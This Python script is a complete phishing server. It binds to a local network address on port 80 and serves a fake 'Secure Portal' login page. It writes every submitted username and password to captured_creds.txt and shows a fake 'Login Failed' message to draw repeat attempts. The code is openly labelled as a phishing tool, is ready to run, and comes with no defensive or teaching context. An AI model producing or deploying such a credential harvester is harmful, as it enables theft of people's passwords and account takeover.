from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs 

HOST = "192.168.1.129" 
PORT = 80

class PhishHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        #Serve a fake login page
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html>
        <head>
            <title>Login - Secure Portal</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                .login-box { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
                input { width: 100%; padding: 10px; margin: 5px 0; }
                button { background-color: #28a745; color: white; padding: 10px; border: none; width: 100%; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Login</h2>
                <form method="POST">
                    <input type="text" name="username" placeholder="Username" required><br>
                    <input type="password" name="password" placeholder="Password" required><br>
                    <button type="submit">Sign In</button>
                </form>
            </div>
        </body>
        </html>
        """)

    def do_POST(self):
        #Capture submitted credentials
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)

        #Parse form data (FIXED)
        post_vars = parse_qs(post_data.decode("utf-8"))
        username = post_vars.get("username", [""])[0]
        password = post_vars.get("password", [""])[0]

        #Log credentials locally
        with open("captured_creds.txt", "a") as f:
            f.write(f"Username: {username} | Password: {password}\n")

        #Respond with a fake error message
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html>
        <body>
            <h2 style="color:red;">Login Failed. Please Try Again.</h2>
        </body>
        </html>
        """)

#Run the server on eth1
if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), PhishHandler)
    print(f"[*] Phishing server running on eth1 (port {PORT})")
    server.serve_forever()
